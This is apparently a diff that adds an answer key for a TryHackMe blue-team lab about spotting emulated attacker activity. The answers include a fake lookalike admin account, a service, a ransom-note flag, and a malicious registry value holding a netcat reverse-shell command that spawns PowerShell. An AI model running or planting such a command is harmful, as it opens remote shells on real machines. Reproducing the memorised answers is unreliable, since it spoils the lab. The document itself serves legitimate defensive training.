@@ -1,0 +1,29 @@
+Atomic Bird Goes Purple #2
+https://tryhackme.com/room/atomicbirdtwo
+
+Which PowerShell library file is detected?
+YamlDotNet.xml
+
+What is the code snippet that needs to be added to the code?
+,*.bak
+
+What is the secret key?
+L1LAFLHQ5peGsjh7Pee8wHFY1SBQHe85A1HZhVrK47Yf6cqmH3n8
+
+What is the new account name?
+Adminstrator
+
+What is the name of the created service?
+thm-registered-service
+
+Which image is used to set the registry value for the created service?
+C:\Windows\system32\services.exe
+
+What is the ransom note?
+THM{THM_Offline_Index_Emulation}
+
+What is the updated file extension?
+.thm-jhn
+
+What is the assigned value of the malicious registry value?
+nc 10.10.thm.jhn 4499 -e powershell
